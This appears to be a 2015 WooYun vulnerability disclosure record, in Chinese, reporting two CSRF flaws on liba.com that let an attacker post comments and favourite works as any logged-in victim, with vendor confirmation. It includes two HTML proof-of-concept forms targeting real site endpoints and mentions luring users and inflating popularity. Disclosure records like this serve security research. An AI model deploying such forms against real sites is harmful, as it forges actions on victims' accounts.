{"id": 69121, "wybug_id": "wooyun-2015-0138938", "wybug_title": "篱笆网两处CSRF任意刷评论,任意收藏作品", "wybug_corp": "篱笆网", "wybug_author": "Xenc", "wybug_date": "2015-09-04 13:51", "wybug_open_date": "2015-10-23 16:48", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向公众公开  简要描述： 篱笆网，原名无忧团购网对于商家篱笆网是宣传媒体，是营销顾问，是销售渠道。通过篱笆网，商家可以针对准确的目标客户群进行产品最有效的宣传，网站还可以为商家提供专业的营销顾问服务，协助商家轻松开拓网络销售渠道，快速提升销售量。篱笆网是交流平台，是采购顾问，是消费保镖。通过篱笆网，会员可以学习交流消费知识、消费信息，更可通过网站、电话、团购卡等方式与网站商家进行交易，在享受优惠价格的同时，获得消费安全保障。 详细说明：  篱笆网两处CSRF任意刷评论,修改用户资料测试过程:在首页随便找一个作品,然后在评论处抓包\n\n评论处没有验证用户ID  那么就存在CSRF 同时对任意一个用户 都可以csrf 不需要用户ID我们构造CSRF POC:\n<html>  <body>    <form action=\"http://bang.liba.com/resource/decorate/delicacy/album/1412/comment\" method=\"POST\">      <input type=\"hidden\" name=\"comment\" value=\"test\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n将其保存,打开HTML\n\n单机按钮 出现下图\n\n然后我们返回作品那里看看\n\n我注册的用户进行测试,\n\n再次打开HTML，单击后如下:\n\nr***0 是另一个用户我们再次返回作品看看\n\n成功进行了 csrf 利用的当然还有其方法,例如 在一个帖子 让别人进去, 那么就会让其他的用户中招, 但是我没有进行下去CSRF任意收藏作品:点击收藏的时候抓包\n\n构造csrfpoc\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form action=\"http://bang.liba.com/resource/decorate/delicacy/album/1412/collect\" method=\"POST\">      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n没有csrf收藏前\n\n打开 单机后\n\n返回作品\n\n成功了 我们用另一个号测试\n\n没有收藏我们打开HTML \n\n\n\n成功了当然 利用csrf刷名气  貌似还是可以的求rank   漏洞证明：  篱笆网两处CSRF任意刷评论,修改用户资料测试过程:在首页随便找一个作品,然后在评论处抓包\n\n评论处没有验证用户ID  那么就存在CSRF 同时对任意一个用户 都可以csrf 不需要用户ID我们构造CSRF POC:\n<html>  <body>    <form action=\"http://bang.liba.com/resource/decorate/delicacy/album/1412/comment\" method=\"POST\">      <input type=\"hidden\" name=\"comment\" value=\"test\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n将其保存,打开HTML\n\n单机按钮 出现下图\n\n然后我们返回作品那里看看\n\n我注册的用户进行测试,\n\n再次打开HTML，单击后如下:\n\nr***0 是另一个用户我们再次返回作品看看\n\n成功进行了 csrf 利用的当然还有其方法,例如 在一个帖子 让别人进去, 那么就会让其他的用户中招, 但是我没有进行下去CSRF任意收藏作品:点击收藏的时候抓包\n\n构造csrfpoc\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form action=\"http://bang.liba.com/resource/decorate/delicacy/album/1412/collect\" method=\"POST\">      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n没有csrf收藏前\n\n打开 单机后\n\n返回作品\n\n成功了 我们用另一个号测试\n\n没有收藏我们打开HTML \n\n\n\n成功了当然 利用csrf刷名气  貌似还是可以的求rank   修复方案：  你懂的   版权声明：转载请注明来源 Xenc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-08 16:47 厂商回复： 已安排修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}